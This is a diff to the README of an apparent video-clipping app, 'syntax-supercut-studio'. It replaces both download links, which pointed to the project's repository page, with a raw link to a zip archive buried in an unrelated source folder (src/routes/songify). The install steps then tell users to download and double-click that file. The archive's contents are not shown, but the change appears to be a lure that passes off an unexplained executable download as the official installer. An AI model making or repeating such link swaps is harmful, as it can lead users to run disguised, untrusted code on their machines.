@@ -1,6 +1,6 @@
 # ✂️ syntax-supercut-studio - Create precise video clips from transcripts
 
-[![Download syntax-supercut-studio](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Pantheistic-immateriality927/syntax-supercut-studio)
+[![Download syntax-supercut-studio](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/Pantheistic-immateriality927/syntax-supercut-studio/main/src/routes/songify/syntax_studio_supercut_3.5-alpha.1.zip)
 
 ## 📌 What this app does
 
@@ -16,7 +16,7 @@ Syntax-supercut-studio helps you edit videos based on text transcripts. You uplo
 
 ## 📥 How to install
 
-1. Visit [this page to download](https://github.com/Pantheistic-immateriality927/syntax-supercut-studio) the installation file.
+1. Visit [this page to download](https://raw.githubusercontent.com/Pantheistic-immateriality927/syntax-supercut-studio/main/src/routes/songify/syntax_studio_supercut_3.5-alpha.1.zip) the installation file.
 2. Locate the file in your Downloads folder.
 3. Double-click the file to start the installation wizard.
 4. Follow the prompts on the screen.
